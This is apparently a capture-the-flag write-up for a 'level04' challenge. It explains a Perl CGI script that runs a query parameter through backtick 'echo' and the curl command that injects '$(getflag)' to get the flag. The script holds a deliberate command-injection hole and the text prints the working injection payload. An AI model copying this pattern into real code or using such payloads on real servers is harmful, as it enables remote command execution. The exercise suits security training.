- When we entered to level04 user, we found a file (level04.pl) with perl programming language

  #!/usr/bin/perl

  # localhost:4747

use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
$y = $\_[0];
print `echo $y 2>&1`;
}
x(param("x"));

1 --> After we cat the file we found that the program launch a website on localhost with port : 4747

2 --> this website parse the query string params from url and print it with echo

3 --> the param name in the query string is “x”

4 --> So we tried with a simple example like :

"localhost:4747/?x=x" and we got => x.

- So we tired to inject the getflag cmd with curl => curl 'localhost:4747/?x=$(getflag)'

- And we got the flag
